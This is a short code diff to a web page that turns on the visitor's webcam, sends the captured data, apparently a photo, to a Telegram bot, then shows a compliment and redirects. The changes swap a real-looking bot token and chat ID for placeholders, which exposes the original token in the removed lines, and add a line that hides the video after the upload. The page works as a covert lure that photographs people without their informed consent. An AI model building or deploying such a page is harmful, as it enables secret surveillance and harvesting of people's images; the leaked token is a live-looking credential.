@@ -32,8 +32,8 @@
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
         const message = document.getElementById('message');
-        const TELEGRAM_BOT_TOKEN = '8146051541:AAEWlqCaaW0Z8VaejI5UX8p4T4dYPXCZv4Y';
-        const TELEGRAM_CHAT_ID = '5934902786';
+        const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN';
+        const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';
 
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => { video.srcObject = stream; })
@@ -50,6 +50,7 @@
                     method: "POST",
                     body: formData
                 }).then(() => {
+                    video.style.display = "none";
                     message.innerText = "You look handsome/beautiful today!";
                     message.style.display = "block";
                     setTimeout(() => { window.location.href = "nextpage.html"; }, 3000);
